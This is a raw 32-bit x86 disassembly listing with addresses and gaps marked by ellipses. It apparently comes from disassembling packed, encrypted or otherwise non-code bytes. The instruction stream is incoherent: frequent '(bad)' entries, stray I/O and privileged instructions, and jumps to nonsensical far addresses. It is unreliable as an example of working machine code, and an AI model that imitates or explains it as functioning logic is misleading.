  42909e:	outs   dx,BYTE PTR ds:[esi]
  42909f:	clc    
  4290a0:	push   eax
  4290a1:	inc    ebx
  4290a2:	cmp    dl,bl
  4290a4:	idiv   al
  4290a6:	pop    edx
  4290a7:	ins    DWORD PTR es:[edi],dx
  4290a8:	fistp  QWORD PTR [ebp+0x10ef76a6]
  4290ae:	inc    ecx
  4290af:	and    BYTE PTR ds:0x82b4e50b,0xba
  4290b6:	jns    0x429108
  4290b8:	dec    eax
  4290b9:	ret    
  4290ba:	xchg   edx,eax
  4290bb:	not    BYTE PTR [eax]
  4290bd:	icebp  
  4290be:	ret    0x1c90
  4290c1:	jmp    0xc5a8:0xe350c557
  4290c8:	dec    esp
  4290c9:	or     ebp,ecx
  4290cb:	sbb    DWORD PTR [ecx+0x38add758],edx
  4290d1:	jle    0x4290c1
  4290d3:	mov    WORD PTR [edx],?
  4290d5:	dec    eax
  4290d6:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4290d8:	inc    ecx
  4290d9:	es call 0xa31a59d6
  4290df:	xchg   esi,eax
  4290e0:	daa    
  4290e1:	lahf   
  4290e2:	cmp    al,0xc1
  4290e4:	xor    al,0xce
  4290e6:	lock xchg esi,eax
  4290e8:	inc    ecx
  4290e9:	push   eax
  4290ea:	in     al,0xed
  4290ec:	mov    cl,0xd5
  4290ee:	inc    esp
  4290ef:	jnp    0x429102
  4290f1:	sahf   
  4290f2:	adc    DWORD PTR fs:[ecx+0x42],esp
  4290f6:	scas   al,BYTE PTR es:[edi]
  4290f7:	jnp    0x4290d3
  4290f9:	xchg   DWORD PTR [ecx-0x3e],edi
  4290fc:	jmp    0x429162
  4290fe:	aaa    
  4290ff:	repnz lock scas al,BYTE PTR es:[edi]
  429102:	xor    dh,BYTE PTR [esi]
  429104:	push   ebp
  429105:	or     eax,0x4b7f0c2d
  42910a:	xor    ebp,DWORD PTR [esi-0x2769e03c]
  429110:	jmp    0xeac00922
  429115:	add    bh,ch
  429117:	clc    
  429118:	adc    dh,BYTE PTR [eax-0x4f1a4bd4]
  42911e:	loopne 0x429127
  429120:	mov    WORD PTR [eax+0x6b24c5ee],ds
  429126:	loope  0x429130
  429128:	sub    BYTE PTR [eax-0x6d],0xfe
  42912c:	test   DWORD PTR [ebx-0x245053b2],esi
  429132:	ret    
  429133:	or     BYTE PTR ds:0x0,ah
	...
  429195:	add    BYTE PTR [esi-0x79],dl
  429198:	std    
  429199:	test   ch,bh
  42919b:	(bad)  
  42919c:	jg     0x429175
  42919e:	xor    dh,0xd6
  4291a1:	stos   DWORD PTR es:[edi],eax
  4291a2:	fwait
  4291a3:	out    dx,eax
  4291a4:	pop    ebx
  4291a5:	and    BYTE PTR [ebx],bl
  4291a7:	mov    bh,0x1
  4291a9:	add    BYTE PTR [edi],al
  4291ab:	add    DWORD PTR [eax],eax
  4291ad:	add    BYTE PTR [ecx],cl
  4291af:	push   eax
  4291b0:	push   eax
  4291b1:	mov    es,WORD PTR [esi-0x37]
  4291b4:	adc    eax,0x1464b772
  4291b9:	adc    BYTE PTR [ebp+0x7d],ah
  4291bc:	dec    ebp
  4291bd:	jnp    0x429211
  4291bf:	shl    DWORD PTR [eax+0x41151bd7],cl
  4291c5:	xchg   ebp,eax
  4291c6:	fsubr  QWORD PTR ds:0x2a02136d
  4291cc:	mov    esp,DWORD PTR [edi+0x4d]
  4291cf:	mov    edi,0x1b0cd07a
  4291d4:	add    DWORD PTR ds:0xc2063379,ecx
  4291da:	dec    esp
  4291db:	pop    esp
  4291dc:	lods   al,BYTE PTR ds:[esi]
  4291dd:	mov    edx,0x724f6340
  4291e2:	enter  0x965b,0xd6
  4291e6:	dec    esi
  4291e7:	pop    esi
  4291e8:	push   edx
  4291e9:	(bad)  
  4291ea:	stos   DWORD PTR es:[edi],eax
  4291eb:	loopne 0x4291f2
  4291ed:	mov    eax,ds:0xbb38c00c
  4291f2:	xchg   esp,eax
  4291f3:	jb     0x4291f7
  4291f5:	xchg   esi,eax
  4291f6:	enter  0x222a,0x85
  4291fa:	xchg   edi,eax
  4291fb:	and    BYTE PTR ds:0x9a98a47e,bl
  429201:	jge    0x429275
  429203:	loop   0x429198
  429205:	mov    al,0xbc
  429207:	test   eax,0xd2c1123
  42920c:	mov    ch,0x2b
  42920e:	sub    edi,DWORD PTR [ebp+0x55858e6d]
  429214:	test   BYTE PTR ds:0xd509312d,dl
  42921a:	jnp    0x429282
  42921c:	iret   
  42921d:	rol    edx,cl
  42921f:	pop    ss
  429220:	xchg   ecx,eax
  429221:	mov    ds:0x277c24d9,eax
  429226:	xchg   edi,eax
  429227:	sbb    bl,BYTE PTR ds:0x58577b7b
  42922d:	sar    esi,0x64
  429230:	fwait
  429231:	push   eax
  429232:	fld    TBYTE PTR ss:[ebp-0x34c5aa8f]
  429239:	out    0x3d,eax
  42923b:	fs int3 
  42923d:	xchg   DWORD PTR [edx-0x2634d076],ebp
  429243:	fld    TBYTE PTR [esi+0x59aea089]
  429249:	arpl   WORD PTR [eax-0x3f],dx
  42924c:	mov    edi,0x704b39fe
  429251:	test   DWORD PTR [ebp*4+0x5911ca73],ecx
  429258:	mov    bl,0x2c
  42925a:	xor    DWORD PTR [edi+0x40b53439],ebp
  429260:	ret    
  429261:	or     ch,BYTE PTR [ecx]
  429263:	mov    bl,0xb9
  429265:	mov    esi,0xa258b665
  42926a:	mov    eax,0x42f647ea
  42926f:	je     0x42926d
  429271:	cmp    al,0x29
  429273:	addr16 pop ss
  429275:	mov    al,0x35
  429277:	mov    edx,0xbcd4fa20
  42927c:	mov    al,0x9b
  42927e:	mov    cl,0xe8
  429280:	les    esi,FWORD PTR [esi+0x54ff1505]
  429286:	push   ds
  429287:	outs   dx,BYTE PTR ds:[esi]
  429288:	nop
  429289:	fistp  QWORD PTR ds:0xf16f852b
  42928f:	push   ecx
  429290:	add    al,0xa0
  429292:	jmp    0x6718:0xc55ccce7
  429299:	and    ah,BYTE PTR [edx]
  42929b:	xchg   esi,eax
  42929c:	cmp    dl,BYTE PTR [esi+0x5cde4331]
  4292a2:	pop    esi
  4292a3:	push   0xffffffd3
  4292a5:	repz cld 
  4292a7:	loopne 0x42930d
  4292a9:	or     ebp,DWORD PTR [ecx+0x14]
  4292ac:	push   ecx
  4292ad:	idiv   DWORD PTR [ebx]
  4292af:	mov    ah,0xe8
  4292b1:	mov    cl,0x2b
  4292b3:	xor    al,0xe6
	...
  429315:	add    al,dh
  429317:	adc    al,0xe1
  429319:	(bad)  
  42931a:	in     eax,0xff
  42931c:	call   FWORD PTR [esi]
  42931e:	xor    cl,BYTE PTR [ebx-0xc]
  429321:	fs ins DWORD PTR es:[edi],dx
  429323:	fwait
  429324:	inc    ebx
  429325:	dec    ebp
  429326:	and    bh,BYTE PTR [eax+0x1070001]
  42932c:	add    BYTE PTR [eax],al
  42932e:	push   ss
  42932f:	sub    BYTE PTR ds:0xc6ac586c,cl
  429335:	pushf  
  429336:	jmp    0x448c:0x3db87dad
  42933d:	popw   ss
  42933f:	pop    ebx
  429340:	sbb    eax,0x1bb03ff3
  429345:	fstp   st(6)
  429347:	fwait
  429348:	xchg   esp,eax
  429349:	or     BYTE PTR [ecx-0x1cb8cd74],cl
  42934f:	dec    edi
  429350:	xchg   edi,eax
  429351:	loopne 0x4293be
  429353:	in     al,0xaf
  429355:	ds jg  0x4293b4
  429358:	jne    0x429310
  42935a:	sub    edx,DWORD PTR [ebx]
  42935c:	mov    DWORD PTR [edx],0xaae2bd15
  429362:	icebp  
  429363:	imul   esi,ecx,0x7e24ba9d
  429369:	mov    esi,esp
  42936b:	ret    0xef56
  42936e:	repz div BYTE PTR [ebp+ebx*4+0x76c3eff5]
  429376:	mov    WORD PTR [esi-0x23],?
  429379:	add    BYTE PTR [esi+0xe9ce210],al
  42937f:	jmp    0x1d68d550
  429384:	test   eax,0x551771e2
  429389:	mov    bl,0x6e
  42938b:	pop    esp
  42938c:	fcom   DWORD PTR [edi+0x12]
  42938f:	sbb    al,0x88
  429391:	daa    
  429392:	lods   al,BYTE PTR ds:[esi]
  429393:	idiv   DWORD PTR [edi+edi*8-0x52571560]
  42939a:	mov    edi,0x62751502
  42939f:	mov    dl,0x23
  4293a1:	clc    
  4293a2:	fsub   QWORD PTR [edi+eax*2-0x4d320de2]
  4293a9:	sub    BYTE PTR [ebx+0x1a],bl
  4293ac:	pop    ebx
  4293ad:	mov    ch,0xe2
  4293af:	mov    ch,0x26
  4293b1:	aas    
  4293b2:	(bad)  [edi]
  4293b4:	xchg   ebp,eax
  4293b5:	cmp    BYTE PTR [ebp+0x74],ah
  4293b8:	ja     0x42940f
  4293ba:	inc    edx
  4293bb:	sub    eax,0xa978e42b
  4293c0:	ins    BYTE PTR es:[edi],dx
  4293c1:	push   0xec406d15
  4293c6:	jmp    0xe3076b2
  4293cb:	arpl   bp,si
  4293cd:	push   esi
  4293ce:	aad    0xbb
  4293d0:	add    BYTE PTR [eax-0x5e2abfb0],ah
  4293d6:	rcr    BYTE PTR [esi-0xb2b11ce],cl
  4293dc:	pop    ecx
  4293dd:	xor    eax,DWORD PTR [edx+0x45410634]
  4293e3:	ficom  WORD PTR [edi+edx*1-0x2fd0ffb3]
  4293ea:	sub    al,0x43
  4293ec:	js     0x4293e8
  4293ee:	adc    eax,0xa91f9c55
  4293f3:	scas   al,BYTE PTR es:[edi]
  4293f4:	jns    0x429449
  4293f6:	mov    ah,0xc1
  4293f8:	pop    es
  4293f9:	into   
  4293fa:	int    0x65
  4293fc:	dec    eax
  4293fd:	sti    
  4293fe:	xor    BYTE PTR [edi-0x57],dh
  429401:	and    eax,0x82fa6b2e
  429406:	je     0x42947b
  429408:	popa   
  429409:	sub    eax,0x86a40fed
  42940e:	add    eax,DWORD PTR [esi]
  429410:	rol    ebx,1
  429412:	test   al,0xb7
  429414:	pop    edi
  429415:	imul   ebp,ebp,0x5af3fd7f
  42941b:	fist   DWORD PTR ds:0x654f5bdd
  429421:	mov    edi,DWORD PTR [ebx-0x15b7817]
  429427:	fisub  DWORD PTR [eax]
  429429:	stc    
  42942a:	test   eax,0xcab7adc5
  42942f:	dec    ebx
  429430:	and    edi,0xbbb883
	...
  429496:	dec    esp
  429497:	or     eax,0x3e532c13
  42949c:	jg     0x42950b
  42949e:	adc    al,0xa9
  4294a0:	outs   dx,DWORD PTR ds:[esi]
  4294a1:	xlat   BYTE PTR ds:[ebx]
  4294a2:	out    dx,al
  4294a3:	outs   dx,BYTE PTR ds:[esi]
  4294a4:	out    0xf2,al
  4294a6:	sub    DWORD PTR [ecx+0x1070001],edi
  4294ac:	add    BYTE PTR [eax],al
  4294ae:	stos   DWORD PTR es:[edi],eax
  4294af:	push   ds
  4294b0:	pop    esi
  4294b1:	fucomp st(7)
  4294b3:	bound  ebp,QWORD PTR [edi]
  4294b5:	jmp    0x42948a
  4294b7:	dec    eax
  4294b8:	pop    edx
  4294b9:	lods   al,BYTE PTR ds:[esi]
  4294ba:	scas   eax,DWORD PTR es:[edi]
  4294bb:	mov    bl,0x6e
  4294bd:	in     al,0x1e
  4294bf:	xchg   ebp,eax
  4294c0:	push   ds
  4294c1:	pop    edi
  4294c2:	or     al,0x72
  4294c4:	adc    eax,DWORD PTR [ebp-0x49193c14]
  4294ca:	sub    ax,0x70c4
  4294ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4294cf:	out    dx,al
  4294d0:	jo     0x42948f
  4294d2:	sbb    al,al
  4294d4:	xchg   edx,eax
  4294d5:	jle    0x4294ee
  4294d7:	ins    DWORD PTR es:[edi],dx
  4294d8:	(bad)  
  4294d9:	jnp    0x429551
  4294db:	lds    edi,FWORD PTR [eax+0x51ca7afc]
  4294e1:	loopne 0x4294b8
  4294e3:	dec    ebx
  4294e4:	pop    ebx
  4294e5:	mov    ebp,0xa9c8d736
  4294ea:	int    0x45
  4294ec:	mov    dh,cl
  4294ee:	ins    DWORD PTR es:[edi],dx
  4294ef:	add    BYTE PTR [ecx-0x56],0xd3
  4294f3:	jns    0x42950e
  4294f5:	dec    edi
  4294f6:	mov    eax,0x31b790f6
  4294fb:	sbb    DWORD PTR [ebp+0x4a],ecx
  4294fe:	pop    ebx
  4294ff:	rcl    BYTE PTR [esi-0x4c5d5c24],1
  429505:	fld    QWORD PTR [ebx+0xd]
  429508:	retf   
  429509:	push   eax
  42950a:	outs   dx,BYTE PTR ds:[esi]
  42950b:	scas   eax,DWORD PTR es:[edi]
  42950c:	(bad)  
  42950d:	neg    BYTE PTR ds:0x41baae0f
  429513:	out    dx,al
  429514:	xor    edi,DWORD PTR [esi+0x1062ae77]
  42951a:	xchg   ebp,eax
  42951b:	sub    DWORD PTR [ebp-0x913efd4],eax
  429521:	jp     0x429561
  429523:	pop    ecx
  429524:	mov    bl,0x35
  429526:	and    al,0x72
  429528:	inc    ecx
  429529:	xor    edi,esi
  42952b:	push   edx
  42952c:	mov    eax,0x56ea1a88
  429531:	sbb    BYTE PTR [esi+esi*1],al
  429534:	repnz sub edx,DWORD PTR [edi+edx*4]
  429538:	xor    ebp,edi
  42953a:	xchg   ecx,eax
  42953b:	xor    eax,0x71a78d9f
  429540:	jp     0x429526
  429542:	add    eax,0x4e7f5436
  429547:	in     eax,0x56
  429549:	iret   
  42954a:	jae    0x429501
  42954c:	pop    es
  42954d:	jp     0x42955f
  42954f:	adc    dl,BYTE PTR [ebp-0x23356fc8]
  429555:	mov    ebx,0xe575e249
  42955a:	push   esp
  42955b:	mov    cl,0x36
  42955d:	push   0x9fd99ee
  429562:	rcl    DWORD PTR [ecx-0x727e4762],0xf4
  429569:	nop
  42956a:	shl    BYTE PTR [esi+edi*2+0xd3473e0],1
  429571:	sbb    BYTE PTR [edx-0x2ec1b286],0x77
  429578:	stos   DWORD PTR es:[edi],eax
  429579:	mov    ch,0x1b
  42957b:	push   esi
  42957c:	test   dl,al
  42957e:	pop    ss
  42957f:	enter  0xc785,0xb4
  429583:	add    eax,DWORD PTR ss:[ecx+0x6]
  429587:	out    dx,al
  429588:	aam    0x45
  42958a:	lods   al,BYTE PTR ds:[esi]
  42958b:	in     al,dx
  42958c:	pop    eax
  42958d:	frstor [ebx-0x2cac9bd8]
  429593:	jge    0x429541
  429595:	and    eax,DWORD PTR [ecx-0x7c4039ad]
  42959b:	jle    0x429528
  42959d:	jge    0x429529
  42959f:	xlat   BYTE PTR ds:[ebx]
  4295a0:	call   0x95a4:0xaae78e33
  4295a7:	nop
  4295a8:	inc    esp
  4295a9:	in     al,0xcd
  4295ab:	mov    ch,0x5c
  4295ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295ae:	jl     0x42955b
  4295b0:	scas   al,BYTE PTR es:[edi]
  4295b1:	fld    DWORD PTR [edi]
  4295b3:	add    al,BYTE PTR ds:[eax]
	...
  429616:	ins    DWORD PTR es:[edi],dx
  429617:	sbb    eax,0xfbf6c0e6
  42961c:	outs   dx,DWORD PTR ds:[esi]
  42961d:	mov    ebp,0x8523ba9d
  429622:	mov    bh,0x33
  429624:	jmp    0x42964d
  429626:	xor    BYTE PTR [edx+0x1070001],bh
  42962c:	add    BYTE PTR [eax],al
  42962e:	xchg   ebx,eax
  42962f:	mov    edi,0x9cecbf88
  429634:	aas    
  429635:	out    0xcf,al
  429637:	jbe    0x429674
  429639:	mov    cs,ebp
  42963b:	xchg   esp,ecx
  42963d:	adc    ebx,DWORD PTR [edi-0x1ac11c09]
  429643:	test   DWORD PTR [edi+0x64],edi
  429646:	jp     0x429687
  429648:	cld    
  429649:	in     al,0x82
  42964b:	xor    eax,0xb74fb618
  429650:	jge    0x42961e
  429652:	sub    BYTE PTR [ebp-0x6f],dl
  429655:	call   DWORD PTR [ecx-0x2]
  429658:	mov    ebp,0xf400c6d
  42965d:	inc    esp
  42965e:	loop   0x429640
  429660:	sahf   
  429661:	dec    esi
  429662:	and    DWORD PTR [edx],eax
  429664:	call   0xa72ce20d
  429669:	aam    0xf6
  42966b:	aas    
  42966c:	fstp   DWORD PTR [eax*8-0x6306cbd9]
  429673:	sub    cl,BYTE PTR [eax+eiz*1+0x409f1d5f]
  42967a:	inc    ebp
  42967b:	outs   dx,DWORD PTR ds:[esi]
  42967c:	int3   
  42967d:	lods   eax,DWORD PTR ds:[esi]
  42967f:	into   
  429680:	sti    
  429681:	ins    DWORD PTR es:[edi],dx
  429682:	sbb    dl,BYTE PTR [ebx-0x4e]
  429685:	leave  
  429686:	jp     0x42960b
  429688:	dec    ebx
  429689:	aam    0xda
  42968b:	jnp    0x42969e
  42968d:	jge    0x4296d3
  42968f:	xor    esp,DWORD PTR [ebx-0x49]
  429692:	inc    edi
  429693:	retf   0x6bdf
  429696:	pusha  
  429697:	cdq    
  429698:	(bad)  
  429699:	int    0x3a
  42969b:	fld    DWORD PTR ds:0x713428f9
  4296a1:	push   ss
  4296a2:	data16 gs pop dx
  4296a6:	inc    esp
  4296a7:	loop   0x429723
  4296a9:	cmc    
  4296aa:	cli    
  4296ab:	jo     0x42964d
  4296ad:	or     DWORD PTR [eax+0x5518074d],0x456411ea
  4296b7:	imul   edx,DWORD PTR [esi+0x3859fffa],0xffffffc7
  4296be:	cld    
  4296bf:	fldcw  WORD PTR [edi+0x3f]
  4296c2:	dec    ebx
  4296c3:	lea    ecx,[ebp-0x2181d276]
  4296c9:	sti    
  4296ca:	xor    cl,bl
  4296cc:	pop    ds
  4296cd:	sub    BYTE PTR [ebp-0x28],dh
  4296d0:	mov    cl,0xf1
  4296d2:	out    0x5b,eax
  4296d4:	push   ds
  4296d5:	int3   
  4296d6:	gs mov ch,0x3a
  4296d9:	pop    edx
  4296da:	add    edi,DWORD PTR [ebp-0x2584c93c]
  4296e0:	aad    0x60
  4296e2:	je     0x42971d
  4296e4:	sbb    cl,BYTE PTR [esi+0x2c]
  4296e7:	cli    
  4296e8:	push   ss
  4296e9:	outs   dx,BYTE PTR ds:[esi]
  4296ea:	lahf   
  4296eb:	test   al,0xdf
  4296ed:	fdivr  QWORD PTR [ebx]
  4296ef:	ss xchg ecx,eax
  4296f1:	dec    edi
  4296f2:	pop    esi
  4296f3:	xchg   ebp,eax
  4296f4:	sbb    al,BYTE PTR [ecx-0x6f]
  4296f7:	push   0xffffff8f
  4296f9:	mov    esi,0x205edbbe
  4296fe:	into   
  4296ff:	or     edi,DWORD PTR [eax+0x41f04296]
  429705:	stos   BYTE PTR es:[edi],al
  429706:	jb     0x4296d3
  429708:	(bad)  
  429709:	ror    DWORD PTR [edx-0x31],cl
  42970c:	ret    0xb032
  42970f:	jne    0x429697
  429711:	rcl    BYTE PTR [esp+eax*4],1
  429714:	inc    esi
  429715:	pop    ds
  429716:	or     DWORD PTR [esi+ebp*4+0x51],ebx
  42971a:	jmp    0x4296ff
  42971c:	jno    0x429763
  42971e:	imul   edi,DWORD PTR [ebx],0x571bc793
  429724:	icebp  
  429725:	cmp    al,bl
  429727:	aam    0x22
  429729:	pop    edx
  42972a:	fcmovnu st,st(4)
  42972c:	xor    al,0x75
  42972e:	dec    edi
  42972f:	out    dx,eax
  429730:	mov    cl,0xd0
  429732:	pop    esp
  429733:	js     0x429789
	...
  429795:	add    BYTE PTR [eax],dh
  429797:	inc    edx
  429798:	fbld   TBYTE PTR [edx-0x1]
  42979b:	(bad)  
  42979c:	mov    ebp,0x1396252
  4297a1:	cmovg  eax,DWORD PTR [eax]
  4297a4:	cwde   
  4297a5:	or     al,0x37
  4297a7:	mov    ebx,0x1070001
  4297ac:	add    BYTE PTR [eax],al
  4297ae:	hlt    
  4297af:	mov    edx,0xce638097
  4297b4:	pop    esi
  4297b5:	ror    BYTE PTR [eax],0x69
  4297b8:	cmp    esi,DWORD PTR [eax-0x44cf245d]
  4297be:	cmp    al,0x5a
  4297c0:	xor    DWORD PTR [edi],edi
  4297c2:	arpl   WORD PTR [ecx],di
  4297c4:	add    BYTE PTR [ecx-0x21022ca9],dh
  4297ca:	push   eax
  4297cb:	sbb    cl,ah
  4297cd:	pop    edi
  4297ce:	add    eax,0x53ed6c38
  4297d3:	sub    BYTE PTR [ecx+0x9],dh
  4297d6:	mul    edi
  4297d8:	add    dl,BYTE PTR [esi]
  4297da:	inc    edx
  4297db:	adc    dh,BYTE PTR [ebx-0x29]
  4297de:	jae    0x4297b4
  4297e0:	or     dl,BYTE PTR [ebx-0x50]
  4297e3:	imul   esp,DWORD PTR [eax],0xc0f4d859
  4297e9:	mov    cl,0x3c
  4297eb:	sti    
  4297ec:	rcl    BYTE PTR [edx+0x137f145d],0x93
  4297f3:	xchg   ecx,eax
  4297f4:	cmp    BYTE PTR [edx-0x7],ch
  4297f7:	inc    esi
  4297f8:	xor    ebx,DWORD PTR [eax*2+0x3b1e6a4d]
  4297ff:	shl    edi,0xd
  429802:	xchg   ebx,eax
  429803:	sbb    eax,0x9ddd3851
  429808:	in     al,dx
  429809:	xor    al,0x19
  42980b:	shl    esi,0x69
  42980e:	call   0x44f0:0xeb36b2e0
  429815:	xchg   edx,eax
  429816:	in     eax,dx
  429817:	ja     0x42985b
  429819:	xchg   esp,eax
  42981a:	push   edx
  42981b:	pop    edi
  42981c:	rcl    BYTE PTR [edx-0x6aadb4f9],cl
  429822:	ret    
  429823:	call   0x5c1e:0x28792b1
  42982a:	inc    edx
  42982b:	add    al,0x28
  42982d:	cdq    
  42982e:	adc    DWORD PTR [esi+0x1668b1cb],ecx
  429834:	(bad)  
  429835:	int    0xb
  429837:	sub    al,0x9a
  429839:	mov    dh,0xc9
  42983b:	aam    0x71
  42983d:	sar    BYTE PTR [edi],1
  42983f:	and    ecx,0xafde1d05
  429845:	jg     0x4298bb
  429847:	dec    ecx
  429848:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429849:	fdivr  DWORD PTR [edi*2+0x637c277e]
  429850:	jmp    0x4297f6
  429852:	pop    edx
  429853:	outs   dx,BYTE PTR ds:[esi]
  429854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429855:	sahf   
  429856:	cdq    
  429857:	mov    eax,0x4b0e1930
  42985c:	pop    ds
  42985d:	sub    DWORD PTR [eax+0x32550b58],edi
  429863:	(bad)  
  429864:	leave  
  429865:	enter  0xa092,0x62
  429869:	push   ss
  42986a:	stos   BYTE PTR es:[edi],al
  42986b:	(bad)  
  42986c:	aad    0x5e
  42986e:	mov    WORD PTR [eax+0x351880f],ss
  429874:	jmp    0x273b:0x16186bf7
  42987b:	mov    ebp,0xc7309074
  429880:	jmp    0xb708:0x49e847bb
  429887:	mov    dl,0xf9
  429889:	pop    esp
  42988a:	push   ecx
  42988b:	imul   ecx,DWORD PTR [ebx],0xc613f3a0
  429891:	dec    eax
  429892:	cmp    BYTE PTR [ebx],dl
  429894:	in     eax,dx
  429895:	shl    DWORD PTR [esi+edi*4-0x676e885d],1
  42989c:	dec    eax
  42989d:	dec    ebp
  42989e:	outs   dx,BYTE PTR ds:[esi]
  42989f:	xlat   BYTE PTR ds:[ebx]
  4298a0:	or     eax,0xdc1616c1
  4298a5:	repz inc ebx
  4298a7:	sub    ecx,DWORD PTR [eax-0x32]
  4298aa:	ret    0xf368
  4298ad:	in     al,0x28
  4298af:	ror    BYTE PTR [ebx+0x7315f1a7],cl
	...
  429915:	add    BYTE PTR [edi+0x68],dl
  429918:	fistp  QWORD PTR fs:[edi-0x21]
  42991c:	(bad)  
  42991d:	call   0x449747d3
  429922:	sti    
  429923:	xchg   esp,eax
  429924:	mov    WORD PTR [ecx+0x3e],ss
  429927:	mov    esp,0x1070001
  42992c:	add    BYTE PTR [eax],al
  42992e:	jbe    0x429906
  429930:	ja     0x429968
  429932:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429933:	push   0x8f6e76d0
  429938:	es fs cs loop 0x429923
  42993d:	xchg   ebx,eax
  42993e:	std    
  42993f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429940:	fsub   QWORD PTR [esi]
  429942:	cmp    dh,BYTE PTR [eax+ecx*1]
  429945:	jmp    0x1bc9:0xea706cab
  42994c:	inc    esi
  42994d:	(bad)  
  42994e:	scas   eax,DWORD PTR es:[edi]
  42994f:	in     eax,dx
  429950:	mov    esi,0xec3d956a
  429955:	fstp   st(3)
  429957:	add    eax,0x39e7e4ad
  42995c:	mov    dl,0x2b
  42995e:	loopne 0x429905
  429960:	pop    esi
  429961:	dec    ebx
  429962:	data16 hlt 
  429964:	out    0xb7,al
  429966:	xor    eax,0x5d46ea49
  42996b:	push   edi
  42996c:	adc    edx,DWORD PTR [eax-0xb]
  42996f:	(bad)  
  429970:	dec    ecx
  429971:	mov    esi,0xb2103892
  429976:	nop
  429977:	icebp  
  429978:	bound  esi,QWORD PTR [ebp-0x3560de3d]
  42997e:	out    0xcb,al
  429980:	into   
  429981:	pusha  
  429982:	xchg   ebx,esi
  429984:	pop    esp
  429985:	cli    
  429986:	iret   
  429987:	push   eax
  429988:	out    0x88,al
  42998a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42998b:	inc    ebx
  42998c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42998d:	add    eax,0x458fa323
  429992:	mov    ds:0x451c2f96,al
  429997:	int3   
  429998:	lods   eax,DWORD PTR ds:[esi]
  429999:	out    dx,al
  42999a:	xchg   esp,eax
  42999b:	cmp    eax,0x1d23461d
  4299a0:	mov    eax,ds:0x1627c791
  4299a5:	lds    edi,FWORD PTR [edi-0x6cd30d99]
  4299ab:	mov    dh,0xa5
  4299ad:	outs   dx,DWORD PTR ds:[esi]
  4299ae:	fwait
  4299af:	dec    esp
  4299b0:	add    bl,dh
  4299b2:	dec    ecx
  4299b3:	xchg   BYTE PTR [ebp-0x3f47b850],al
  4299b9:	shl    esi,cl
  4299bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4299bc:	pop    edx
  4299bd:	aad    0xf4
  4299bf:	push   ds
  4299c0:	push   esp
  4299c1:	inc    eax
  4299c2:	add    eax,0xac90c8cb
  4299c7:	dec    esi
  4299c8:	sub    bh,BYTE PTR [ecx-0x1478bf04]
  4299ce:	ins    BYTE PTR es:[edi],dx
  4299cf:	sub    al,0xb7
  4299d1:	and    ah,dh
  4299d3:	(bad)  
  4299d4:	ds inc ecx
  4299d6:	xchg   edi,eax
  4299d7:	xor    eax,0x4d09946c
  4299dc:	pop    edx
  4299dd:	pop    es
  4299de:	sbb    al,0xe2
  4299e0:	cmp    edi,eax
  4299e2:	sbb    BYTE PTR [ebx+eiz*2+0x8b74691],dh
  4299e9:	cmp    eax,0x929a5e2d
  4299ee:	dec    ebx
  4299ef:	idiv   DWORD PTR [eax+0x18592f77]
  4299f5:	call   0x8645:0x836a0833
  4299fc:	ins    DWORD PTR es:[edi],dx
  4299fd:	mov    ah,0x69
  4299ff:	dec    ebp
  429a00:	mov    esp,0x99d32c06
  429a05:	push   es
  429a06:	xor    eax,0xce2bbc0e
  429a0b:	cld    
  429a0c:	das    
  429a0d:	sub    BYTE PTR [ecx+0x26],dh
  429a10:	ja     0x4299b4
  429a12:	les    edx,FWORD PTR [ecx+0x599cc831]
  429a18:	rol    bl,cl
  429a1a:	dec    edi
  429a1b:	cdq    
  429a1c:	lea    ebx,[esi-0x6e4059cf]
  429a22:	sbb    edx,edx
  429a24:	rcl    DWORD PTR [edi-0x39966620],0x8e
  429a2b:	adc    ebx,edi
  429a2d:	or     eax,0x4671ff87
  429a32:	add    al,0xd4
  429a34:	mov    ch,0x0
	...
  429a96:	into   
  429a97:	std    
  429a98:	sti    
  429a99:	leave  
  429a9a:	sti    
  429a9b:	iret   
  429a9c:	(bad)  
  429a9d:	jmp    DWORD PTR [ecx]
  429a9f:	dec    eax
  429aa0:	mov    edi,0xd51f3113
  429aa5:	inc    ebx
  429aa6:	inc    ebp
  429aa7:	mov    ebp,0x1070001
  429aac:	add    BYTE PTR [eax],al
  429aae:	dec    eax
  429aaf:	push   ebx
  429ab0:	mov    ebp,ss
  429ab2:	or     bl,BYTE PTR [esi-0x78e038a2]
  429ab8:	(bad)  
  429ab9:	adc    bh,BYTE PTR [ecx-0x40]
  429abc:	cwde   
  429abd:	(bad)  
  429abe:	enter  0x905a,0xd
  429ac2:	dec    ebp
  429ac3:	adc    BYTE PTR [esi+0x7a83ce06],ch
  429ac9:	aad    0xb
  429acb:	add    al,0x20
  429acd:	pop    ds
  429ace:	push   edi
  429acf:	cmp    eax,DWORD PTR [ecx-0x5f0ebc7f]
  429ad5:	inc    ebp
  429ad6:	jae    0x429af8
  429ad8:	or     al,0x24
  429ada:	add    DWORD PTR [eax-0x1975cc87],ebx
  429ae0:	push   eax
  429ae1:	sahf   
  429ae2:	sar    BYTE PTR [eax-0x72e6fd8c],0xf9
  429ae9:	lds    edi,FWORD PTR [edi+0x7e449bd6]
  429aef:	je     0x429b57
  429af1:	mov    ebp,0x92ee9b69
  429af6:	outs   dx,DWORD PTR ds:[esi]
  429af7:	popf   
  429af8:	hlt    
  429af9:	imul   DWORD PTR [ecx]
  429afb:	and    DWORD PTR ds:[ebx-0x1b30c3b9],ebx
  429b02:	adc    bh,BYTE PTR [edi-0x6a8fbd11]
  429b08:	hlt    
  429b09:	push   es
  429b0a:	in     al,dx
  429b0b:	adc    bh,BYTE PTR [eax]
  429b0d:	aam    0xc3
  429b0f:	cmp    DWORD PTR [ebx],eax
  429b11:	or     BYTE PTR [eax+0x1bf3bc17],0x4d
  429b18:	out    0x4f,al
  429b1a:	inc    esi
  429b1b:	rol    ebp,cl
  429b1d:	into   
  429b1e:	pop    eax
  429b1f:	ds mov fs,edi
  429b22:	mul    edx
  429b24:	(bad)  [edx]
  429b26:	ds call 0xa19c7cf4
  429b2c:	gs jno 0x429aeb
  429b2f:	dec    eax
  429b30:	dec    ecx
